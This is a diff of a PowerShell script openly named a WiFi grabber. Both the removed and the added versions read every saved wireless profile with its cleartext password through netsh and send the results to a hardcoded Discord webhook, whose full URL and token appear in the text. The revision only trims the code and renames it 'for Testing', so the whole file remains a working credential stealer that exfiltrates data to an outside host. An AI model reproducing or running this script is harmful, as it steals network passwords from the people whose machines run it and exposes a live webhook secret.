@@ -1,30 +1,25 @@
-# WiFi Grabber Script - Collects WiFi passwords and sends them to a Discord Webhook
+# Minimal WiFi Grabber Script for Testing
 
 try {
-    # Step 1: Collect saved WiFi profiles
-    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }
+    # Collect WiFi profiles
+    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }
 
-    # Initialize variable to store WiFi credentials
+    # Initialize WiFi credentials variable
     $wifiCreds = ""
 
-    # Step 2: Loop through each profile and extract the password (if available)
-    foreach ($profile in $wifiProfiles) {
+    # Loop through each profile and retrieve the key (password)
+    foreach ($profile in $profiles) {
         $details = netsh wlan show profile name="$profile" key=clear | Select-String "(SSID name|Key Content)"
         $wifiCreds += "`nProfile: $profile`n$details`n"
     }
 
-    # Step 3: Prepare the Discord Webhook URL (Replace with your own)
-    $webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"
+    # Send credentials to Discord webhook (replace with your webhook URL)
+    $webhook = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"
+    $body = @{ content = "WiFi Credentials:`n```$wifiCreds```" } | ConvertTo-Json -Depth 10
 
-    # Step 4: Prepare the JSON payload for the Discord message
-    $body = @{
-        content = "WiFi Credentials Grabbed:`n```$wifiCreds```"
-    } | ConvertTo-Json -Depth 10
-
-    # Step 5: Send the WiFi credentials to the Discord webhook
-    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json'
+    Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'
 
 } catch {
-    # Step 6: Handle any errors and log them to a local file for debugging
-    "Error: $($_.Exception.Message)" | Out-File -FilePath "C:\temp\wifi_grabber_error.log" -Append
+    # Simple error logging
+    "Error: $($_.Exception.Message)" | Out-File -FilePath "C:\temp\wifi_error.log" -Append
 }
